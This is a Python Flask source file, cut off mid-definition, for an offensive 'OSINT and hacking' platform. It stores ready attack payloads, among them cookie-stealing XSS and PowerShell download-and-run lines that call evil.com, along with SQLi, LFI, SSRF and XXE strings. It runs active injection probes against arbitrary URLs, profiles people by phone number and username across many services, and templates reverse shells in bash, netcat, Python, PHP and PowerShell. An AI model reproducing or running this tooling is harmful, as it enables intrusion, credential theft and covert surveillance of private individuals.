#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║              🔥 SHADOW OSINT v9.0 - WORLD DOMINATION 🔥                     ║
║        أقوى منصة استخبارات واختراق أخلاقي متكاملة في العالم                    ║
║                  المستخدم يتحمل المسؤولية القانونية كاملة                      ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os, re, sys, json, time, socket, ssl, base64, hashlib, secrets, sqlite3
import random, string, subprocess, threading, traceback, binascii
from datetime import datetime, timedelta
from urllib.parse import urlparse, urljoin, quote, unquote, parse_qs
from collections import defaultdict, Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, render_template_string, request, jsonify, send_file, session as flask_session

# ==================== Flask ====================
web_app = Flask(__name__)
web_app.secret_key = secrets.token_hex(32)
PORT = int(os.environ.get("PORT", 8080))
MAX_WORKERS = 30
executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)

# ==================== Database ====================
DB = "shadow_v9.db"

class Database:
    def __init__(self, path):
        self.path = path
    
    def connect(self):
        conn = sqlite3.connect(self.path)
        conn.row_factory = sqlite3.Row
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("PRAGMA busy_timeout=5000")
        conn.execute("PRAGMA foreign_keys=ON")
        return conn
    
    def execute(self, query, params=()):
        conn = self.connect()
        try:
            cur = conn.execute(query, params)
            conn.commit()
            return cur
        finally:
            conn.close()
    
    def fetch(self, query, params=()):
        conn = self.connect()
        try:
            return [dict(r) for r in conn.execute(query, params).fetchall()]
        finally:
            conn.close()
    
    def fetchone(self, query, params=()):
        conn = self.connect()
        try:
            r = conn.execute(query, params).fetchone()
            return dict(r) if r else None
        finally:
            conn.close()

db = Database(DB)

# ==================== Initialize ====================
def initialize():
    db.execute("""
        CREATE TABLE IF NOT EXISTS scans (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target TEXT, scan_type TEXT, result TEXT,
            ip_address TEXT, user_agent TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    
    db.execute("""
        CREATE TABLE IF NOT EXISTS payloads (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            category TEXT, name TEXT, payload TEXT,
            description TEXT, risk_level TEXT
        )
    """)
    
    db.execute("""
        CREATE TABLE IF NOT EXISTS vulnerabilities (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target TEXT, vuln_type TEXT, severity TEXT,
            description TEXT, payload TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    
    db.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE, password_hash TEXT,
            is_admin INTEGER DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    
    # Seed payloads if empty
    count = db.fetchone("SELECT COUNT(*) as c FROM payloads")
    if count and count.get('c', 0) == 0:
        seed_payloads()

def seed_payloads():
    payloads = [
        # XSS Payloads
        ("XSS", "Basic Alert", '<script>alert("XSS")</script>', "Basic XSS test", "Medium"),
        ("XSS", "Cookie Stealer", '<script>fetch("https://evil.com/?c="+document.cookie)</script>', "Steals cookies", "High"),
        ("XSS", "DOM Injection", '#"><img src=x onerror=alert(1)>', "DOM-based XSS", "Medium"),
        ("XSS", "SVG Payload", '<svg onload=alert(1)>', "SVG XSS", "Medium"),
        ("XSS", "Case Bypass", '<ScRiPt>alert(1)</ScRiPt>', "Case filter bypass", "Medium"),
        ("XSS", "Event Handler", '<body onload=alert("XSS")>', "Body event XSS", "Medium"),
        ("XSS", "IMG Onerror", '<img src=x onerror="alert(document.cookie)">', "IMG XSS with cookie steal", "High"),
        ("XSS", "Iframe Injection", '<iframe src="javascript:alert(1)">', "Iframe XSS", "Medium"),
        ("XSS", "Polyglot", 'jaVasCript:/*-/*`/*`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e', "XSS Polyglot", "Critical"),
        
        # SQL Injection
        ("SQLi", "Union Based", "' UNION SELECT 1,2,3,4,5-- -", "Union SQLi", "High"),
        ("SQLi", "Error Based", "' AND 1=CONVERT(int,(SELECT @@version))--", "Error SQLi", "High"),
        ("SQLi", "Time Blind", "'; WAITFOR DELAY '0:0:5'--", "Time-based blind", "High"),
        ("SQLi", "Boolean Blind", "' AND 1=1--", "Boolean blind", "Medium"),
        ("SQLi", "Stacked Query", "'; DROP TABLE users--", "Stacked query", "Critical"),
        ("SQLi", "Extract Tables", "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--", "Extract tables", "High"),
        ("SQLi", "Out of Band", "'; EXEC xp_dirtree '\\\\evil.com\\share'--", "OOB SQLi", "Critical"),
        
        # Command Injection
        ("RCE", "Command Injection", "; ls -la", "Basic command injection", "Critical"),
        ("RCE", "Pipe Injection", "| whoami", "Pipe injection", "Critical"),
        ("RCE", "Backtick", "`id`", "Backtick injection", "Critical"),
        ("RCE", "Newline", "\\nid\\n", "Newline bypass", "Critical"),
        ("RCE", "Powershell", "| powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\"", "Powershell RCE", "Critical"),
        
        # File Inclusion
        ("LFI", "Path Traversal", "../../../etc/passwd", "Basic LFI", "High"),
        ("LFI", "Null Byte", "../../../etc/passwd%00", "Null byte bypass", "High"),
        ("LFI", "PHP Filter", "php://filter/convert.base64-encode/resource=index.php", "PHP filter", "High"),
        ("LFI", "Log Poisoning", "/var/log/apache2/access.log", "Log poisoning", "Critical"),
        ("LFI", "Session Files", "/tmp/sess_", "Session file inclusion", "High"),
        ("RFI", "Remote Include", "http://evil.com/shell.txt", "Remote file inclusion", "Critical"),
        
        # SSRF
        ("SSRF", "AWS Metadata", "http://169.254.169.254/latest/meta-data/", "AWS SSRF", "Critical"),
        ("SSRF", "Internal Scan", "http://localhost:8080", "Internal port scan", "Medium"),
        ("SSRF", "File Protocol", "file:///etc/passwd", "SSRF file read", "Critical"),
        ("SSRF", "Gopher", "gopher://evil.com:1234/_", "Gopher SSRF", "High"),
        
        # SSTI
        ("SSTI", "Jinja2", "{{7*7}}", "Jinja2 SSTI", "High"),
        ("SSTI", "Django", "{% debug %}", "Django SSTI", "High"),
        ("SSTI", "Smarty", "{php}echo 'test';{/php}", "Smarty SSTI", "High"),
        ("SSTI", "Twig", "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "Twig RCE", "Critical"),
        
        # XXE
        ("XXE", "Basic", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "XXE injection", "Critical"),
        ("XXE", "Blind", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe"> %xxe;]>', "Blind XXE", "Critical"),
        
        # CSRF
        ("CSRF", "Form Submit", '<form action="https://victim.com/transfer" method="POST"><input name="to" value="attacker"><input name="amount" value="1000"></form><script>document.forms[0].submit()</script>', "CSRF attack", "High"),
        
        # CORS
        ("CORS", "Origin Reflect", 'Origin: https://evil.com', "CORS misconfiguration", "Medium"),
        
        # JWT
        ("JWT", "None Algorithm", '{"alg":"none","typ":"JWT"}', "JWT none attack", "High"),
        ("JWT", "Key Confusion", '{"alg":"HS256","typ":"JWT"}', "JWT key confusion", "High"),
        
        # Deserialization
        ("Deserialization", "PHP", 'O:8:"stdClass":1:{s:4:"file";s:11:"/etc/passwd";}', "PHP deserialization", "Critical"),
        ("Deserialization", "Java", 'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==', "Java deserialization", "Critical"),
        
        # SSI
        ("SSI", "Command Exec", '<!--#exec cmd="ls" -->', "SSI injection", "Critical"),
        
        # LDAP
        ("LDAP", "Injection", '*)(uid=*))(|(uid=*', "LDAP injection", "High"),
        
        # NoSQL
        ("NoSQL", "MongoDB", '{"$gt": ""}', "NoSQL injection", "High"),
    ]
    
    for p in payloads:
        db.execute(
            "INSERT INTO payloads (category, name, payload, description, risk_level) VALUES (?,?,?,?,?)",
            p
        )

# ==================== Initialize DB ====================
initialize()

# ==================== HTTP Client ====================
class HTTPClient:
    def __init__(self):
        self.uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
        ]
    
    def ua(self):
        return random.choice(self.uas)
    
    def get(self, url, **kw):
        try:
            import httpx
            h = {"User-Agent": self.ua(), "Accept": "*/*", "Accept-Language": "en-US,en;q=0.9,ar;q=0.8"}
            h.update(kw.pop('headers', {}))
            return httpx.get(url, headers=h, timeout=kw.pop('timeout', 15), follow_redirects=True, **kw)
        except:
            return None
    
    def post(self, url, **kw):
        try:
            import httpx
            h = {"User-Agent": self.ua(), "Accept": "*/*", "Accept-Language": "en-US,en;q=0.9,ar;q=0.8"}
            h.update(kw.pop('headers', {}))
            return httpx.post(url, headers=h, timeout=kw.pop('timeout', 15), **kw)
        except:
            return None

http = HTTPClient()

# ==================== Phone Intelligence ====================
class PhoneIntel:
    def scan(self, phone):
        r = {"phone": phone, "timestamp": datetime.now().isoformat(), "platforms": {}}
        clean = phone.replace("+", "").replace(" ", "").replace("-", "")
        
        platforms = {
            "whatsapp": (self._check_whatsapp, clean),
            "telegram": (self._check_telegram, phone),
            "viber": (self._check_viber, phone),
            "signal": (self._check_signal, phone),
            "facebook": (self._check_facebook, phone),
            "instagram": (self._check_instagram, phone),
            "snapchat": (self._check_snapchat, phone),
            "twitter": (self._check_twitter, phone),
            "linkedin": (self._check_linkedin, phone),
            "google": (self._check_google, phone),
            "tiktok": (self._check_tiktok, phone),
            "truecaller": (self._check_truecaller, clean),
            "carrier": (self._check_carrier, phone),
            "breaches": (self._check_breaches, phone),
            "numverify": (self._check_numverify, phone),
        }
        
        with ThreadPoolExecutor(max_workers=15) as pool:
            futures = {name: pool.submit(func, arg) for name, (func, arg) in platforms.items()}
            for name, future in futures.items():
                try:
                    r["platforms"][name] = future.result(timeout=10)
                except:
                    r["platforms"][name] = None
        
        return r
    
    def _check_whatsapp(self, clean):
        try:
            r = http.get(f"https://wa.me/{clean}")
            return {"exists": r and "Continue to Chat" in r.text}
        except:
            return None
    
    def _check_telegram(self, phone):
        try:
            r = http.post("https://my.telegram.org/auth/send_password", data={"phone": phone})
            return {"exists": r and ("code" in r.text.lower() or "password" in r.text.lower())}
        except:
            return None
    
    def _check_viber(self, phone):
        try:
            r = http.post("https://api.viber.com/api/v2/check", json={"phone": phone})
            return {"exists": r and r.json().get("exists")} if r else None
        except:
            return None
    
    def _check_signal(self, phone):
        try:
            r = http.get(f"https://api.signal.org/v1/accounts/{phone}", headers={"User-Agent": "Signal-Android/6.0"})
            return {"exists": r and r.status_code == 200}
        except:
            return None
    
    def _check_facebook(self, phone):
        try:
            r = http.get("https://www.facebook.com/login/identify", params={"ctx": "recover"})
            return {"linked": r is not None}
        except:
            return None
    
    def _check_instagram(self, phone):
        try:
            r = http.post("https://www.instagram.com/api/v1/accounts/send_signup_sms/", 
                         data={"phone_number": phone, "device_id": hashlib.md5(phone.encode()).hexdigest()})
            return {"linked": r is not None}
        except:
            return None
    
    def _check_snapchat(self, phone):
        try:
            r = http.post("https://accounts.snapchat.com/accounts/phone_verify", json={"phone": phone})
            return {"linked": r is not None}
        except:
            return None
    
    def _check_twitter(self, phone):
        try:
            r = http.post("https://api.twitter.com/1.1/account/send_verification", data={"phone_number": phone})
            return {"linked": r is not None}
        except:
            return None
    
    def _check_linkedin(self, phone):
        try:
            r = http.get("https://www.linkedin.com/uas/request-password-reset")
            return {"checked": r is not None}
        except:
            return None
    
    def _check_google(self, phone):
        try:
            r = http.get("https://accounts.google.com/signin/v2/recoveryidentifier", params={"flowName": "GlifWebSignIn"})
            return {"checked": r is not None}
        except:
            return None
    
    def _check_tiktok(self, phone):
        try:
            r = http.post("https://www.tiktok.com/passport/email/verify/", data={"phone": phone})
            return {"linked": r is not None}
        except:
            return None
    
    def _check_truecaller(self, clean):
        try:
            r = http.get(f"https://www.truecaller.com/search/eg/{clean}", headers={"Accept-Language": "ar,en;q=0.9"})
            if r and r.status_code == 200:
                import bs4
                soup = bs4.BeautifulSoup(r.text, 'html.parser')
                for s in soup.find_all("script", type="application/ld+json"):
                    if s.string and "name" in s.string:
                        data = json.loads(s.string)
                        if data.get("name"):
                            return {"name": data["name"], "spam_score": data.get("spamScore", 0)}
            return {"found": False}
        except:
            return None
    
    def _check_carrier(self, phone):
        try:
            import phonenumbers
            from phonenumbers import carrier, geocoder, timezone
            p = phonenumbers.parse(phone)
            return {
                "valid": phonenumbers.is_valid_number(p),
                "country": geocoder.description_for_number(p, "en"),
                "carrier": carrier.name_for_number(p, "en"),
                "timezone": list(timezone.time_zones_for_number(p)),
                "type": str(phonenumbers.number_type(p)),
                "national": phonenumbers.format_number(p, phonenumbers.PhoneNumberFormat.NATIONAL),
                "international": phonenumbers.format_number(p, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
            }
        except:
            return None
    
    def _check_breaches(self, phone):
        try:
            r = http.get(f"https://haveibeenpwned.com/api/v3/pasteaccount/{phone}")
            if r and r.status_code == 200:
                return {"count": len(r.json())}
            return {"count": 0}
        except:
            return None
    
    def _check_numverify(self, phone):
        key = os.environ.get("NUMVERIFY_KEY", "")
        if not key:
            return None
        try:
            r = http.get("http://apilayer.net/api/validate", params={"access_key": key, "number": phone, "format": 1})
            if r and r.status_code == 200:
                d = r.json()
                return {
                    "valid": d.get("valid"),
                    "country": d.get("country_name"),
                    "carrier": d.get("carrier"),
                    "line_type": d.get("line_type"),
                    "location": d.get("location")
                }
        except:
            return None

# ==================== IP Intelligence ====================
class IPIntel:
    def scan(self, ip):
        r = {"ip": ip, "timestamp": datetime.now().isoformat()}
        
        with ThreadPoolExecutor(max_workers=10) as pool:
            futures = {
                "geoip": pool.submit(self._geoip, ip),
                "ports": pool.submit(self._ports, ip),
                "dns": pool.submit(self._dns, ip),
                "abuse": pool.submit(self._abuse, ip),
                "shodan": pool.submit(self._shodan, ip),
                "ipinfo": pool.submit(self._ipinfo, ip),
                "vpn": pool.submit(self._check_vpn, ip),
                "tor": pool.submit(self._check_tor, ip),
                "blacklists": pool.submit(self._blacklists, ip),
            }
            
            for name, future in futures.items():
                try:
                    result = future.result(timeout=10)
                    if result is not None:
                        r[name] = result
                except:
                    pass
        
        return r
    
    def _geoip(self, ip):
        try:
            r = http.get(f"http://ip-api.com/json/{ip}?fields=66846719")
            return r.json() if r and r.status_code == 200 else None
        except:
            return None
    
    def _ports(self, ip):
        common_ports = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 111: "RPC", 135: "MSRPC", 139: "NetBIOS",
            143: "IMAP", 443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S",
            1433: "MSSQL", 1521: "Oracle", 3306: "MySQL", 3389: "RDP",
            5432: "PostgreSQL", 5900: "VNC", 6379: "Redis", 8080: "HTTP-Alt",
            8443: "HTTPS-Alt", 9200: "Elasticsearch", 11211: "Memcached", 27017: "MongoDB"
        }
        open_ports = []
        
        with ThreadPoolExecutor(max_workers=50) as pool:
            futures = {}
            for port, service in common_ports.items():
                futures[port] = pool.submit(self._check_port, ip, port)
            
            for port, future in futures.items():
                try:
                    if future.result(timeout=0.5):
                        open_ports.append({"port": port, "service": common_ports[port]})
                except:
                    pass
        
        return {"open": sorted(open_ports, key=lambda x: x["port"]), "total_scanned": len(common_ports)}
    
    def _check_port(self, ip, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            result = s.connect_ex((ip, port)) == 0
            s.close()
            return result
        except:
            return False
    
    def _dns(self, ip):
        try:
            return socket.gethostbyaddr(ip)[0]
        except:
            return None
    
    def _abuse(self, ip):
        key = os.environ.get("ABUSEIPDB_KEY", "")
        if not key: return None
        try:
            r = http.get("https://api.abuseipdb.com/api/v2/check", 
                         params={"ipAddress": ip, "maxAgeInDays": 90, "verbose": ""},
                         headers={"Key": key, "Accept": "application/json"})
            if r and r.status_code == 200:
                d = r.json().get("data", {})
                return {
                    "score": d.get("abuseConfidenceScore", 0),
                    "reports": d.get("totalReports", 0),
                    "isp": d.get("isp", ""),
                    "usage": d.get("usageType", ""),
                    "country": d.get("countryCode", ""),
                    "domain": d.get("domain", "")
                }
        except:
            return None
    
    def _shodan(self, ip):
        key = os.environ.get("SHODAN_KEY", "")
        if not key: return None
        try:
            r = http.get(f"https://api.shodan.io/shodan/host/{ip}", params={"key": key, "minify": "true"})
            if r and r.status_code == 200:
                d = r.json()
                return {
                    "ports": d.get("ports", []),
                    "org": d.get("org", ""),
                    "os": d.get("os", ""),
                    "vulns": list(d.get("vulns", {}).keys())[:10],
                    "domains": d.get("domains", []),
                    "hostnames": d.get("hostnames", []),
                    "country": d.get("country_name", ""),
                    "city": d.get("city", ""),
                    "last_update": d.get("last_update", "")
                }
        except:
            return None
    
    def _ipinfo(self, ip):
        token = os.environ.get("IPINFO_TOKEN", "")
        try:
            url = f"https://ipinfo.io/{ip}/json"
            if token: url += f"?token={token}"
            r = http.get(url)
            return r.json() if r and r.status_code == 200 else None
        except:
            return None
    
    def _check_vpn(self, ip):
        try:
            r = http.get(f"https://vpnapi.io/api/{ip}")
            if r and r.status_code == 200:
                d = r.json()
                return {
                    "vpn": d.get("security", {}).get("vpn", False),
                    "proxy": d.get("security", {}).get("proxy", False),
                    "tor": d.get("security", {}).get("tor", False),
                    "relay": d.get("security", {}).get("relay", False)
                }
        except:
            return None
    
    def _check_tor(self, ip):
        try:
            r = http.get("https://check.torproject.org/torbulkexitlist")
            if r and r.status_code == 200:
                return ip in r.text.strip().split("\n")
        except:
            return None
    
    def _blacklists(self, ip):
        bls = ["zen.spamhaus.org", "bl.spamcop.net", "dnsbl.sorbs.net", "b.barracudacentral.org", "xbl.spamhaus.org", "pbl.spamhaus.org"]
        results = {}
        reversed_ip = ".".join(reversed(ip.split(".")))
        for bl in bls:
            try:
                socket.gethostbyname(f"{reversed_ip}.{bl}")
                results[bl] = True
            except:
                results[bl] = False
        return results

# ==================== Vulnerability Scanner ====================
class VulnScanner:
    def __init__(self):
        self.payloads = db.fetch("SELECT * FROM payloads")
    
    def scan(self, url):
        r = {"url": url, "timestamp": datetime.now().isoformat(), "vulnerabilities": [], "info": {}}
        
        # SSL
        try:
            hostname = urlparse(url).hostname or url
            ctx = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    expiry = datetime.strptime(cert.get("notAfter"), "%b %d %H:%M:%S %Y %Z")
                    r["ssl"] = {
                        "issuer": dict(x[0] for x in cert.get("issuer", [])),
                        "valid_from": cert.get("notBefore"),
                        "valid_to": cert.get("notAfter"),
                        "days_left": (expiry - datetime.now()).days,
                        "expired": expiry < datetime.now(),
                        "self_signed": cert.get("issuer") == cert.get("subject")
                    }
                    if expiry < datetime.now():
                        r["vulnerabilities"].append({"type": "SSL Expired", "severity": "High", "description": "SSL certificate has expired"})
                    if r["ssl"]["days_left"] < 30:
                        r["vulnerabilities"].append({"type": "SSL Expiring", "severity": "Medium", "description": f"SSL expires in {r['ssl']['days_left']} days"})
                    if r["ssl"]["self_signed"]:
                        r["vulnerabilities"].append({"type": "Self-Signed SSL", "severity": "Medium", "description": "Using self-signed certificate"})
        except Exception as e:
            r["ssl"] = {"error": str(e)}
        
        # Headers
        try:
            resp = http.get(url)
            if resp:
                sec_headers = {
                    "Strict-Transport-Security": resp.headers.get("Strict-Transport-Security"),
                    "Content-Security-Policy": resp.headers.get("Content-Security-Policy"),
                    "X-Frame-Options": resp.headers.get("X-Frame-Options"),
                    "X-Content-Type-Options": resp.headers.get("X-Content-Type-Options"),
                    "X-XSS-Protection": resp.headers.get("X-XSS-Protection"),
                    "Referrer-Policy": resp.headers.get("Referrer-Policy"),
                    "Permissions-Policy": resp.headers.get("Permissions-Policy")
                }
                missing = [k for k, v in sec_headers.items() if not v]
                r["headers"] = {
                    "present": {k: v for k, v in sec_headers.items() if v},
                    "missing": missing,
                    "score": len([v for v in sec_headers.values() if v]) * 100 // len(sec_headers),
                    "server": resp.headers.get("Server", ""),
                    "powered_by": resp.headers.get("X-Powered-By", "")
                }
                
                if not sec_headers["X-Frame-Options"]:
                    r["vulnerabilities"].append({"type": "Clickjacking", "severity": "Medium", "description": "No X-Frame-Options header"})
                if not sec_headers["X-Content-Type-Options"]:
                    r["vulnerabilities"].append({"type": "MIME Sniffing", "severity": "Low", "description": "No X-Content-Type-Options header"})
                if resp.headers.get("Server"):
                    r["vulnerabilities"].append({"type": "Server Disclosure", "severity": "Low", "description": f"Server: {resp.headers['Server']}"})
        except:
            pass
        
        # Technology
        try:
            resp = http.get(url)
            if resp:
                import bs4
                soup = bs4.BeautifulSoup(resp.text, 'html.parser')
                tech = []
                
                gen = soup.find("meta", {"name": "generator"})
                if gen: tech.append({"type": "CMS", "name": gen.get("content", "")})
                
                js_libs = {
                    "jquery": "jQuery", "react": "React", "vue": "Vue.js",
                    "angular": "Angular", "bootstrap": "Bootstrap", "lodash": "Lodash",
                    "moment": "Moment.js", "d3": "D3.js", "three": "Three.js"
                }
                
                for s in soup.find_all("script", src=True):
                    src = s.get("src", "").lower()
                    for key, name in js_libs.items():
                        if key in src:
                            tech.append({"type": "JavaScript", "name": name})
                
                r["technology"] = list({t["name"]: t for t in tech}.values())
        except:
            pass
        
        # Sensitive files
        sensitive = {
            "/.env": "Environment file",
            "/.git/config": "Git config",
            "/wp-config.php": "WordPress config",
            "/wp-config.php.bak": "WordPress backup",
            "/backup.zip": "Backup file",
            "/phpinfo.php": "PHP info",
            "/server-status": "Apache status",
            "/.DS_Store": "DS Store",
            "/admin/": "Admin panel",
            "/wp-admin/": "WordPress admin",
            "/robots.txt": "Robots file",
            "/sitemap.xml": "Sitemap",
            "/.htaccess": "HTAccess file",
            "/crossdomain.xml": "Crossdomain",
            "/elmah.axd": "ELMAH log",
            "/trace.axd": "Trace log",
        }
        
        for path, desc in sensitive.items():
            try:
                chk = http.get(urljoin(url, path))
                if chk and chk.status_code == 200 and len(chk.text) > 10:
                    r["vulnerabilities"].append({
                        "type": "Exposed File",
                        "severity": "High" if "config" in path.lower() or "env" in path.lower() else "Medium",
                        "description": f"{desc}: {path}",
                        "url": urljoin(url, path)
                    })
            except:
                pass
        
        # SQLi test
        try:
            sqli_tests = [
                ("'", "SQL error"),
                ("' OR '1'='1", "SQL tautology"),
                ("' UNION SELECT NULL--", "Union test"),
                ("' AND SLEEP(5)--", "Time-based"),
            ]
            for payload, desc in sqli_tests:
                test_url = f"{url}{'&' if '?' in url else '?'}id={quote(payload)}"
                start = time.time()
                resp = http.get(test_url)
                elapsed = time.time() - start
                
                if resp:
                    sql_errors = ["sql", "mysql", "sqlite", "postgresql", "oracle", "syntax error", "unclosed", "odbc", "driver", "database error"]
                    for err in sql_errors:
                        if err in resp.text.lower():
                            r["vulnerabilities"].append({
                                "type": "SQL Injection",
                                "severity": "Critical",
                                "description": f"Potential SQLi ({desc}): error detected",
                                "payload": payload,
                                "url": test_url
                            })
                            break
                    if elapsed > 4:
                        r["vulnerabilities"].append({
                            "type": "SQL Injection (Time-based)",
                            "severity": "Critical",
                            "description": f"Response delayed {elapsed:.1f}s",
                            "payload": payload
                        })
        except:
            pass
        
        # XSS test
        try:
            xss_payload = quote("<script>alert('XSS')</script>")
            test_url = f"{url}{'&' if '?' in url else '?'}q={xss_payload}"
            resp = http.get(test_url)
            if resp and "<script>alert('XSS')</script>" in resp.text:
                r["vulnerabilities"].append({
                    "type": "Reflected XSS",
                    "severity": "High",
                    "description": "Reflected XSS detected in parameter",
                    "payload": "<script>alert('XSS')</script>",
                    "url": test_url
                })
        except:
            pass
        
        # VirusTotal
        key = os.environ.get("VIRUSTOTAL_KEY", "")
        if key:
            try:
                url_id = base64.urlsafe_b64encode(url.encode()).decode().rstrip("=")
                resp = http.get(f"https://www.virustotal.com/api/v3/urls/{url_id}", headers={"x-apikey": key})
                if resp and resp.status_code == 200:
                    stats = resp.json().get("data", {}).get("attributes", {}).get("last_analysis_stats", {})
                    r["virustotal"] = stats
                    if stats.get("malicious", 0) > 0:
                        r["vulnerabilities"].append({
                            "type": "Malicious URL",
                            "severity": "Critical",
                            "description": f"Detected by {stats['malicious']} security vendors"
                        })
            except:
                pass
        
        return r

# ==================== Username Scanner ====================
class UsernameIntel:
    def scan(self, username):
        r = {"username": username, "timestamp": datetime.now().isoformat(), "platforms": {}}
        
        platforms = {
            "GitHub": (f"https://github.com/{username}", "Not Found"),
            "Twitter": (f"https://twitter.com/{username}", "This account doesn"),
            "Instagram": (f"https://www.instagram.com/{username}/", "Page Not Found"),
            "Reddit": (f"https://www.reddit.com/user/{username}", "page not found"),
            "TikTok": (f"https://www.tiktok.com/@{username}", "Couldn't find"),
            "Snapchat": (f"https://www.snapchat.com/add/{username}", "not found"),
            "YouTube": (f"https://www.youtube.com/@{username}", "doesn't exist"),
            "Twitch": (f"https://www.twitch.tv/{username}", "Sorry"),
            "Pinterest": (f"https://www.pinterest.com/{username}/", "not found"),
            "Spotify": (f"https://open.spotify.com/user/{username}", "not found"),
            "Steam": (f"https://steamcommunity.com/id/{username}", "not be found"),
            "Roblox": (f"https://www.roblox.com/user.aspx?username={username}", "not be found"),
            "DeviantArt": (f"https://www.deviantart.com/{username}", "not found"),
            "Patreon": (f"https://www.patreon.com/{username}", "not found"),
            "Medium": (f"https://medium.com/@{username}", "Not Found"),
            "VK": (f"https://vk.com/{username}", "not found"),
            "Flickr": (f"https://www.flickr.com/people/{username}", "not found"),
            "Behance": (f"https://www.behance.net/{username}", "not found"),
            "Dribbble": (f"https://dribbble.com/{username}", "Whoops"),
            "Keybase": (f"https://keybase.io/{username}", "not found"),
            "Pastebin": (f"https://pastebin.com/u/{username}", "Not Found"),
            "SoundCloud": (f"https://soundcloud.com/{username}", "not found"),
            "HackerNews": (f"https://news.ycombinator.com/user?id={username}", "No such user"),
            "GitLab": (f"https://gitlab.com/{username}", "not found"),
            "CodePen": (f"https://codepen.io/{username}", "not found"),
            "Replit": (f"https://replit.com/@{username}", "not found"),
            "Telegram": (f"https://t.me/{username}", "not found"),
            "Blogger": (f"https://{username}.blogspot.com", "not found"),
            "WordPress": (f"https://{username}.wordpress.com", "not found"),
            "Tumblr": (f"https://{username}.tumblr.com", "not found"),
            "About.me": (f"https://about.me/{username}", "not found"),
            "Linktree": (f"https://linktr.ee/{username}", "not found"),
            "Discord": (f"https://discord.com/users/{username}", "not found"),
            "Bitbucket": (f"https://bitbucket.org/{username}/", "not found"),
            "Gravatar": (f"https://gravatar.com/{username}", "not found"),
            "Imgur": (f"https://imgur.com/user/{username}", "not found"),
        }
        
        with ThreadPoolExecutor(max_workers=20) as pool:
            futures = {}
            for name, (url, not_found) in platforms.items():
                futures[name] = pool.submit(self._check, url, not_found)
            
            for name, future in futures.items():
                try:
                    r["platforms"][name] = future.result(timeout=8)
                except:
                    r["platforms"][name] = None
        
        r["found_count"] = sum(1 for v in r["platforms"].values() if v is True)
        r["total_checked"] = len(platforms)
        return r
    
    def _check(self, url, not_found):
        try:
            resp = http.get(url)
            if resp and resp.status_code == 200:
                return not_found.lower() not in resp.text.lower()[:500]
            return False
        except:
            return None

# ==================== Red Team Tools ====================
class RedTeam:
    PAYLOADS = {
        "python": 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        "bash": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
        "nc": "nc -e /bin/sh {LHOST} {LPORT}",
        "nc_mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
        "php": '<?php $s=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");?>',
        "php_exec": '<?php system("nc -e /bin/sh {LHOST} {LPORT}");?>',
        "powershell": 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient(\'{LHOST}\',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+\'PS \'+(pwd).Path+\'> \';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()"',
        "xss_cookie": '<script>new Image().src="{LHOST}/steal?c="+document.cookie</script>',
